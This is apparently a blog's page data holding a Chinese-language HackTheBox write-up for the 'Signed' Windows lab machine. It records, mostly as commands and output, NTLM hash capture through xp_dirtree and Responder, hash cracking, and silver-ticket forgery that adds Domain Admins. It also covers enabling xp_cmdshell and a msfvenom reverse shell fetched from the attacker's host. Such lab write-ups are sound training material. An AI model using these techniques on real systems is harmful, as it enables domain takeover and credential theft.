{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Signed","contentHtml":"<h1>Season8 - Signed</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Signed\">https://app.hackthebox.com/machines/Signed</a></p>\n</blockquote>\n<blockquote>\n<p>As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH</p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Signed/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-python\">➜  Signed nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">5000</span> -p- <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.90</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">14</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">56</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.90</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.041</span>s latency).\nNot shown: <span class=\"hljs-number\">65534</span> filtered tcp ports (no-response)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">1433</span>/tcp <span class=\"hljs-built_in\">open</span>  ms-sql-s\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">26.56</span> seco\n</code></pre>\n<pre><code class=\"hljs language-python\">➜  Signed nmap -sT -A -p <span class=\"hljs-number\">1433</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.80</span>                                                 \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">14</span> <span class=\"hljs-number\">14</span>:02 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> editor.htb (<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.80</span>)\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.041</span>s latency).\n\nPORT     STATE  SERVICE  VERSION\n<span class=\"hljs-number\">1433</span>/tcp closed ms-sql-s\nToo many fingerprints <span class=\"hljs-keyword\">match</span> this host to give specific OS details\nNetwork Distance: <span class=\"hljs-number\">2</span> hops\n\nTRACEROUTE (using proto <span class=\"hljs-number\">1</span>/icmp)\nHOP RTT      ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">39.59</span> ms <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.14</span><span class=\"hljs-number\">.1</span>\n<span class=\"hljs-number\">2</span>   <span class=\"hljs-number\">39.99</span> ms editor.htb (<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.80</span>)\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report <span class=\"hljs-built_in\">any</span> incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">3.07</span> seconds\n</code></pre>\n<h3>枚举</h3>\n<p>通过 nxc 测试凭据</p>\n<pre><code class=\"hljs language-python\">➜  Signed nxc mssql <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.90</span> -u <span class=\"hljs-string\">'scott'</span> -p <span class=\"hljs-string\">'Sm230#C5NatH'</span> --local-auth\nMSSQL       <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.90</span>     <span class=\"hljs-number\">1433</span>   DC01             [*] Windows <span class=\"hljs-number\">10</span> / Server <span class=\"hljs-number\">2019</span> Build <span class=\"hljs-number\">17763</span> (name:DC01) (domain:SIGNED.HTB)\nMSSQL       <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.90</span>     <span class=\"hljs-number\">1433</span>   DC01             [+] DC01\\scott:Sm230<span class=\"hljs-comment\">#C5NatH</span>\n</code></pre>\n<p>通过 <code>mssqlclient.py</code> 进行连接</p>\n<pre><code class=\"hljs language-python\">➜  Signed mssqlclient.py signed.htb/<span class=\"hljs-string\">'scott'</span>:<span class=\"hljs-string\">'Sm230#C5NatH'</span>@<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.90</span> -dc-ip <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.90</span>   \n  <span class=\"hljs-keyword\">import</span> pkg_resources\nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: <span class=\"hljs-number\">4096</span>, New Value: <span class=\"hljs-number\">16192</span>\n[*] INFO(DC01): Line <span class=\"hljs-number\">1</span>: Changed database context to <span class=\"hljs-string\">'master'</span>.\n[*] INFO(DC01): Line <span class=\"hljs-number\">1</span>: Changed language setting to us_english.\n[*] ACK: Result: <span class=\"hljs-number\">1</span> - Microsoft SQL Server (<span class=\"hljs-number\">160</span> <span class=\"hljs-number\">3232</span>) \n[!] Press <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> extra shell commands\nSQL (scott  guest@master)> \n</code></pre>\n<h3>MSSQL 枚举</h3>\n<p>尝试枚举一些有用的信息</p>\n<pre><code class=\"hljs language-python\">SQL (scott  guest@master)> enum_db\n[%] select name, is_trustworthy_on <span class=\"hljs-keyword\">from</span> sys.databases\nname     is_trustworthy_on   \n------   -----------------   \nmaster                   <span class=\"hljs-number\">0</span>   \n\ntempdb                   <span class=\"hljs-number\">0</span>   \n\nmodel                    <span class=\"hljs-number\">0</span>   \n\nmsdb                     <span class=\"hljs-number\">1</span>   \n</code></pre>\n<pre><code class=\"hljs language-python\">SQL (scott  guest@master)> enum_users\nUserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   \n------------------   --------   ---------   ---------   -------------   ----------   -----   \ndbo                  db_owner   sa          master      dbo             <span class=\"hljs-string\">b'1         '</span>   <span class=\"hljs-string\">b'01'</span>   \n\nguest                public     NULL        NULL        guest           <span class=\"hljs-string\">b'2         '</span>   <span class=\"hljs-string\">b'00'</span>   \n\nINFORMATION_SCHEMA   public     NULL        NULL        NULL            <span class=\"hljs-string\">b'3         '</span>    NULL   \n\nsys                  public     NULL        NULL        NULL            <span class=\"hljs-string\">b'4         '</span>    NULL   \n</code></pre>\n<p>在里面没有找到什么有趣的东西，大部分都是空的</p>\n<h2><strong>Capture NTLM</strong></h2>\n<p>因为是 guest 用户，所以在数据中做不了什么</p>\n<p>经过一番搜索，在网上找到一篇文章：<a href=\"https://duckwrites.medium.com/capture-ntlm-hashes-with-mssql-an-essential-oscp-tip-0c2433a7815a\">https://duckwrites.medium.com/capture-ntlm-hashes-with-mssql-an-essential-oscp-tip-0c2433a7815a</a></p>\n<p>里边有一个技巧是获得 MSSQL 服务用户的技巧</p>\n<p>开启 <code>responder</code></p>\n<pre><code class=\"hljs language-python\">responder -I tun0\n</code></pre>\n<p>调用存储过程访问我们的 SMB 共享</p>\n<pre><code class=\"hljs language-python\">EXEC xp_dirtree <span class=\"hljs-string\">'\\\\xx.xx.xx.xx\\sunset'</span>\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Signed/image1.png\" alt=\"image.png\"></p>\n<p>尝试破解该 HASH</p>\n<pre><code class=\"hljs language-python\">mssqlsvc::SIGNED:9c2097f413d20155:40C2CB079BCEB3A942A34C7397239437:<span class=\"hljs-number\">0</span>10100000000000000D9B898193DDC01D18861084AB815EB00000000020008005300490045004E0001001E00570049004E002D00330038003700450046005A0049004D004B005100470004003400570049004E002D00330038003700450046005A0049004D004B00510047002E005300490045004E002E004C004F00430041004C00030014005300490045004E002E004C004F00430041004C00050014005300490045004E002E004C004F00430041004C000700080000D9B898193DDC0106000400020000000800300030000000000000000000000000300000360D692AB16CFD02C9A731C97E412BDC5E916522F5FDBA0743CE323968DE2B5F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320038000000000000000000\n</code></pre>\n<p>得到密码 <code>purPLE9795!@</code></p>\n<pre><code class=\"hljs language-python\">hashcat -m <span class=\"hljs-number\">5600</span> <span class=\"hljs-built_in\">hash</span> /usr/share/wordlists/rockyou.txt\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Signed/image2.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">➜  Signed mssqlclient.py signed.htb/<span class=\"hljs-string\">'MSSQLSVC'</span>:<span class=\"hljs-string\">'purPLE9795!@'</span>@<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.90</span> -dc-ip <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.90</span> -windows-auth\n  <span class=\"hljs-keyword\">import</span> pkg_resources\nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: <span class=\"hljs-number\">4096</span>, New Value: <span class=\"hljs-number\">16192</span>\n[*] INFO(DC01): Line <span class=\"hljs-number\">1</span>: Changed database context to <span class=\"hljs-string\">'master'</span>.\n[*] INFO(DC01): Line <span class=\"hljs-number\">1</span>: Changed language setting to us_english.\n[*] ACK: Result: <span class=\"hljs-number\">1</span> - Microsoft SQL Server (<span class=\"hljs-number\">160</span> <span class=\"hljs-number\">3232</span>) \n[!] Press <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> extra shell commands\nSQL (SIGNED\\mssqlsvc  guest@master)>\n</code></pre>\n<h2>Sliver Ticket</h2>\n<p>拿到服务账户了，应尝试一下白银票据，尝试获得 mssql 的管理员账户的权限</p>\n<p>所需条件：</p>\n<ul>\n<li>域名</li>\n<li>域SID</li>\n<li>目标服务器名</li>\n<li>可利用的服务</li>\n<li>服务账号的NTML HASH</li>\n<li>需要伪造的用户名</li>\n</ul>\n<p>我们先要找到我们需要伪造的用户名（列出所有管理员账户）</p>\n<pre><code class=\"hljs language-python\">select mp.name <span class=\"hljs-keyword\">as</span> login, <span class=\"hljs-keyword\">case</span> when mp.is_disabled = <span class=\"hljs-number\">1</span> then <span class=\"hljs-string\">'Disabled'</span> <span class=\"hljs-keyword\">else</span> <span class=\"hljs-string\">'Enabled'</span> end <span class=\"hljs-keyword\">as</span> status, mp.type_desc <span class=\"hljs-keyword\">as</span> <span class=\"hljs-built_in\">type</span> <span class=\"hljs-keyword\">from</span> sys.server_role_members srp join sys.server_principals mp on mp.principal_id = srp.member_principal_id join sys.server_principals rp on rp.principal_id = srp.role_principal_id where rp.name = <span class=\"hljs-string\">'sysadmin'</span> order by mp.name;\n</code></pre>\n<p>看样子是 <code>signed\\IT</code> ，这是一个组</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Signed/image3.png\" alt=\"image.png\"></p>\n<h3>SID</h3>\n<p>现在还要获取域 SID，因为 445 端口没开，所以还是需要通过 mssql 来获取 SID</p>\n<pre><code class=\"hljs language-python\">SQL (SIGNED\\mssqlsvc  guest@master)> SELECT SUSER_SID(<span class=\"hljs-string\">'signed\\it'</span>);\n                                                              \n-----------------------------------------------------------   \n<span class=\"hljs-string\">b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'</span>\n</code></pre>\n<p>然后通过脚本进行转换（通过 AI 生成）</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\">#!/usr/bin/env python3</span>\n<span class=\"hljs-keyword\">import</span> sys\n<span class=\"hljs-keyword\">import</span> struct\n\n<span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">convert_sid</span>(<span class=\"hljs-params\">hex_sid</span>):\n    <span class=\"hljs-string\">\"\"\"Converts a hex SID string to its readable S-1-5-... format.\"\"\"</span>\n    <span class=\"hljs-keyword\">if</span> hex_sid.startswith(<span class=\"hljs-string\">\"0x\"</span>):\n        hex_sid = hex_sid[<span class=\"hljs-number\">2</span>:]\n    \n    <span class=\"hljs-keyword\">try</span>:\n        sid_bytes = <span class=\"hljs-built_in\">bytes</span>.fromhex(hex_sid)\n    <span class=\"hljs-keyword\">except</span> ValueError:\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"Error: Invalid hex string provided.\"</span>\n\n    <span class=\"hljs-comment\"># 1. Revision (1 byte)</span>\n    revision = sid_bytes[<span class=\"hljs-number\">0</span>]\n\n    <span class=\"hljs-comment\"># 2. Sub-authority count (1 byte)</span>\n    sub_authority_count = sid_bytes[<span class=\"hljs-number\">1</span>]\n\n    <span class=\"hljs-comment\"># 3. Identifier Authority (6 bytes, Big-Endian)</span>\n    <span class=\"hljs-comment\"># We read it directly as a 6-byte integer</span>\n    identifier_authority = <span class=\"hljs-built_in\">int</span>.from_bytes(sid_bytes[<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">8</span>], <span class=\"hljs-string\">'big'</span>)\n\n    <span class=\"hljs-comment\"># Build the initial SID string</span>\n    sid_string = <span class=\"hljs-string\">f\"S-<span class=\"hljs-subst\">{revision}</span>-<span class=\"hljs-subst\">{identifier_authority}</span>\"</span>\n\n    <span class=\"hljs-comment\"># 4. Loop through Sub-authorities (each is 4 bytes, Little-Endian)</span>\n    offset = <span class=\"hljs-number\">8</span>\n    <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(sub_authority_count):\n        <span class=\"hljs-comment\"># Unpack 4 bytes as a little-endian unsigned long (&#x3C;L)</span>\n        sub_authority = struct.unpack(<span class=\"hljs-string\">'&#x3C;L'</span>, sid_bytes[offset:offset+<span class=\"hljs-number\">4</span>])[<span class=\"hljs-number\">0</span>]\n        sid_string += <span class=\"hljs-string\">f\"-<span class=\"hljs-subst\">{sub_authority}</span>\"</span>\n        offset += <span class=\"hljs-number\">4</span>\n        \n    <span class=\"hljs-keyword\">return</span> sid_string\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(sys.argv) != <span class=\"hljs-number\">2</span>:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"Usage: <span class=\"hljs-subst\">{sys.argv[<span class=\"hljs-number\">0</span>]}</span> &#x3C;hex_sid_string>\"</span>)\n        sys.exit(<span class=\"hljs-number\">1</span>)\n    \n    input_sid = sys.argv[<span class=\"hljs-number\">1</span>]\n    readable_sid = convert_sid(input_sid)\n    <span class=\"hljs-built_in\">print</span>(readable_sid)\n\n</code></pre>\n<p>得到 <code>signed\\it</code> 的 SID</p>\n<pre><code class=\"hljs language-python\">➜  Signed python sid_converter.py <span class=\"hljs-number\">0</span>105000000000005150000005b7bb0f398aa2245ad4a1ca451040000\nS-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">21</span>-<span class=\"hljs-number\">4088429403</span>-<span class=\"hljs-number\">1159899800</span>-<span class=\"hljs-number\">2753317549</span>-<span class=\"hljs-number\">1105</span>\n</code></pre>\n<p>那么域 SID 就是</p>\n<pre><code class=\"hljs language-python\">S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">21</span>-<span class=\"hljs-number\">4088429403</span>-<span class=\"hljs-number\">1159899800</span>-<span class=\"hljs-number\">2753317549</span>\n</code></pre>\n<p>再计算 MSSQLsvc 用户的 SID</p>\n<pre><code class=\"hljs language-python\">S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">21</span>-<span class=\"hljs-number\">4088429403</span>-<span class=\"hljs-number\">1159899800</span>-<span class=\"hljs-number\">2753317549</span>-<span class=\"hljs-number\">1103</span>\n</code></pre>\n<h3>NTHASH</h3>\n<p>计算 mssqlsvc 的 NTHASH</p>\n<pre><code class=\"hljs language-python\">➜  Signed echo -n <span class=\"hljs-string\">'purPLE9795!@'</span> | iconv -f UTF-<span class=\"hljs-number\">8</span> -t UTF-16LE | openssl dgst -md4\nMD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc\n</code></pre>\n<h3>Silver ticket</h3>\n<p>伪造一个票据，让你能以任意用户（这里是 User ID <code>1103</code>）的身份，并拥有任意权限（这里是 Group <code>1105</code> 的成员），去访问 <code>dc01.signed.htb</code> 主机上的 <code>mssqlsvc</code> 服务</p>\n<pre><code class=\"hljs language-python\">➜  Signed ticketer.py -nthash <span class=\"hljs-string\">\"ef699384c3285c54128a3ee1ddb1a0cc\"</span> -domain-sid <span class=\"hljs-string\">\"S-1-5-21-4088429403-1159899800-2753317549\"</span> -domain <span class=\"hljs-string\">\"signed.htb\"</span> -groups <span class=\"hljs-string\">'1105'</span> -user-<span class=\"hljs-built_in\">id</span> <span class=\"hljs-string\">'1103'</span> -spn <span class=\"hljs-string\">'mssqlsvc/dc01.signed.htb'</span> <span class=\"hljs-string\">'mssqlsvc'</span>\n  <span class=\"hljs-keyword\">import</span> pkg_resources\nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n\n[*] Creating basic skeleton ticket <span class=\"hljs-keyword\">and</span> PAC Infos\n[*] Customizing ticket <span class=\"hljs-keyword\">for</span> signed.htb/mssqlsvc\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket <span class=\"hljs-keyword\">in</span> mssqlsvc.ccache\n</code></pre>\n<pre><code class=\"hljs language-python\">➜  Signed export KRB5CCNAME=mssqlsvc.ccache\n</code></pre>\n<p>注意：这里新加坡的 VPN 无法正常执行命令</p>\n<pre><code class=\"hljs language-python\">➜  Signed mssqlclient.py -k -no-<span class=\"hljs-keyword\">pass</span> dc01.signed.htb -windows-auth                                                                                                                                                                  \n/root/.local/share/pipx/venvs/impacket/lib/python3<span class=\"hljs-number\">.13</span>/site-packages/impacket/version.py:<span class=\"hljs-number\">12</span>: UserWarning: pkg_resources <span class=\"hljs-keyword\">is</span> deprecated <span class=\"hljs-keyword\">as</span> an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources packa\nge <span class=\"hljs-keyword\">is</span> slated <span class=\"hljs-keyword\">for</span> removal <span class=\"hljs-keyword\">as</span> early <span class=\"hljs-keyword\">as</span> <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">30.</span> Refrain <span class=\"hljs-keyword\">from</span> using this package <span class=\"hljs-keyword\">or</span> pin to Setuptools&#x3C;<span class=\"hljs-number\">81.</span>\n  <span class=\"hljs-keyword\">import</span> pkg_resources                                                                                            \nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n                                                         \n[*] Encryption required, switching to TLS                                                                                                                                                                                           \n[-] ERROR(DC01): Line <span class=\"hljs-number\">1</span>: Login failed. The login <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">from</span> an untrusted domain <span class=\"hljs-keyword\">and</span> cannot be used <span class=\"hljs-keyword\">with</span> Integrated authentication.\n➜  Signed mssqlclient.py -k -no-<span class=\"hljs-keyword\">pass</span> dc01.signed.htb                                                                                                                                                                                \n/root/.local/share/pipx/venvs/impacket/lib/python3<span class=\"hljs-number\">.13</span>/site-packages/impacket/version.py:<span class=\"hljs-number\">12</span>: UserWarning: pkg_resources <span class=\"hljs-keyword\">is</span> deprecated <span class=\"hljs-keyword\">as</span> an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources packa\nge <span class=\"hljs-keyword\">is</span> slated <span class=\"hljs-keyword\">for</span> removal <span class=\"hljs-keyword\">as</span> early <span class=\"hljs-keyword\">as</span> <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">30.</span> Refrain <span class=\"hljs-keyword\">from</span> using this package <span class=\"hljs-keyword\">or</span> pin to Setuptools&#x3C;<span class=\"hljs-number\">81.</span>\n  <span class=\"hljs-keyword\">import</span> pkg_resources                                                                                            \nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n                                                         \n[*] Encryption required, switching to TLS                                                                                                                                                                                           \n[-] ERROR(DC01): Line <span class=\"hljs-number\">1</span>: Login failed. The login <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">from</span> an untrusted domain <span class=\"hljs-keyword\">and</span> cannot be used <span class=\"hljs-keyword\">with</span> Integrated authentication.   \n</code></pre>\n<p>切换到 EU 后正常</p>\n<pre><code class=\"hljs language-python\">➜  Signed mssqlclient.py -k -no-<span class=\"hljs-keyword\">pass</span> DC01.signed.htb\n  <span class=\"hljs-keyword\">import</span> pkg_resources\nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: <span class=\"hljs-number\">4096</span>, New Value: <span class=\"hljs-number\">16192</span>\n[*] INFO(DC01): Line <span class=\"hljs-number\">1</span>: Changed database context to <span class=\"hljs-string\">'master'</span>.\n[*] INFO(DC01): Line <span class=\"hljs-number\">1</span>: Changed language setting to us_english.\n[*] ACK: Result: <span class=\"hljs-number\">1</span> - Microsoft SQL Server (<span class=\"hljs-number\">160</span> <span class=\"hljs-number\">3232</span>) \n[!] Press <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> extra shell commands\nSQL (SIGNED\\mssqlsvc  dbo@master)> \n</code></pre>\n<h3>Get Shell</h3>\n<pre><code class=\"hljs language-python\">SQL (SIGNED\\mssqlsvc  dbo@master)> enable_xp_cmdshell\nINFO(DC01): Line <span class=\"hljs-number\">196</span>: Configuration option <span class=\"hljs-string\">'show advanced options'</span> changed <span class=\"hljs-keyword\">from</span> <span class=\"hljs-number\">0</span> to <span class=\"hljs-number\">1.</span> Run the RECONFIGURE statement to install.\nINFO(DC01): Line <span class=\"hljs-number\">196</span>: Configuration option <span class=\"hljs-string\">'xp_cmdshell'</span> changed <span class=\"hljs-keyword\">from</span> <span class=\"hljs-number\">0</span> to <span class=\"hljs-number\">1.</span> Run the RECONFIGURE statement to install.\n</code></pre>\n<pre><code class=\"hljs language-python\">SQL (SIGNED\\mssqlsvc  dbo@master)> xp_cmdshell whoami\noutput            \n---------------   \nsigned\\mssqlsvc   \n\nNULL \n</code></pre>\n<p>进行反弹 shell，测试后发现机器中有 <code>wget</code> 可以用，这里弹 MSF</p>\n<pre><code class=\"hljs language-python\">➜  Signed msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=<span class=\"hljs-number\">4444</span> -f exe -o rev.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows <span class=\"hljs-keyword\">from</span> the payload\n[-] No arch selected, selecting arch: x64 <span class=\"hljs-keyword\">from</span> the payload\nNo encoder specified, outputting raw payload\nPayload size: <span class=\"hljs-number\">510</span> <span class=\"hljs-built_in\">bytes</span>\nFinal size of exe file: <span class=\"hljs-number\">7168</span> <span class=\"hljs-built_in\">bytes</span>\nSaved <span class=\"hljs-keyword\">as</span>: rev.exe\n</code></pre>\n<pre><code class=\"hljs language-python\">xp_cmdshell mkdir C:\\Downloads\nxp_cmdshell powershell wget -Uri <span class=\"hljs-string\">\"http://xx.xx.xx.xx:8080/rev.exe\"</span> -OutFile <span class=\"hljs-string\">\"C:\\Downloads\\rev.exe\"</span>\nxp_cmdshell C:\\Downloads\\rev.exe\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Signed/image4.png\" alt=\"image.png\"></p>\n<p>读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-python\">C:\\Users\\mssqlsvc\\Desktop><span class=\"hljs-built_in\">type</span> user.txt\n<span class=\"hljs-built_in\">type</span> user.txt\nxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>提权</h2>\n<p>和上边差不多，我们需要先找到管理员组的 SID</p>\n<pre><code class=\"hljs language-python\">Import-Module ActiveDirectory\n$domainAdmins = Get-ADGroup -Identity <span class=\"hljs-string\">\"Domain Admins\"</span>\n$domainAdmins.SID\n</code></pre>\n<pre><code class=\"hljs language-python\">BinaryLength AccountDomainSid                          Value                                        \n------------ ----------------                          -----                                        \n<span class=\"hljs-number\">28</span> S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">21</span>-<span class=\"hljs-number\">4088429403</span>-<span class=\"hljs-number\">1159899800</span>-<span class=\"hljs-number\">2753317549</span> S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">21</span>-<span class=\"hljs-number\">4088429403</span>-<span class=\"hljs-number\">1159899800</span>-<span class=\"hljs-number\">2753317549</span>-<span class=\"hljs-number\">512</span>\n</code></pre>\n<p>再次生成银票，将管理员组添加上去</p>\n<pre><code class=\"hljs language-python\">ticketer.py -nthash <span class=\"hljs-string\">\"ef699384c3285c54128a3ee1ddb1a0cc\"</span> -domain-sid <span class=\"hljs-string\">\"S-1-5-21-4088429403-1159899800-2753317549\"</span> -domain <span class=\"hljs-string\">\"signed.htb\"</span> -groups <span class=\"hljs-string\">'1105,512'</span> -user-<span class=\"hljs-built_in\">id</span> <span class=\"hljs-string\">'1103'</span> -spn <span class=\"hljs-string\">'mssqlsvc/dc01.signed.htb'</span> <span class=\"hljs-string\">'mssqlsvc'</span>\n</code></pre>\n<p>直接读<code>root.txt</code></p>\n<pre><code class=\"hljs language-python\">➜  Signed nxc mssql dc01.signed.htb -u <span class=\"hljs-string\">'mssqlsvc'</span> -k --use-kcache -q <span class=\"hljs-string\">\"SELECT BulkColumn FROM OPENROWSET(BULK 'C:\\users\\administrator\\desktop\\root.txt', SINGLE_CLOB) AS a;\"</span>\nMSSQL       dc01.signed.htb <span class=\"hljs-number\">1433</span>   DC01             [*] Windows <span class=\"hljs-number\">10</span> / Server <span class=\"hljs-number\">2019</span> Build <span class=\"hljs-number\">17763</span> (name:DC01) (domain:SIGNED.HTB)\nMSSQL       dc01.signed.htb <span class=\"hljs-number\">1433</span>   DC01             [+] SIGNED.HTB\\mssqlsvc <span class=\"hljs-keyword\">from</span> ccache (Pwn3d!)\nMSSQL       dc01.signed.htb <span class=\"hljs-number\">1433</span>   DC01             BulkColumn:<span class=\"hljs-string\">b'015032292f8626496a1a86ca5a6571c5\\r\\n'</span>\n</code></pre>\n<h2>总结</h2>\n<p>学习到很多，还是太菜了，在一些地方还是死脑筋，感谢 dalao 们的探路</p>","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","updated":"2025-10-14","tags":["HackTheBox","Windows","SilverTicket","MSSQL","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Signed\n\n https://app.hackthebox.com/machines/Signed\n \n\n As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which ca...","isEncrypted":true},"recentPosts":[{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"}]},"__N_SSG":true}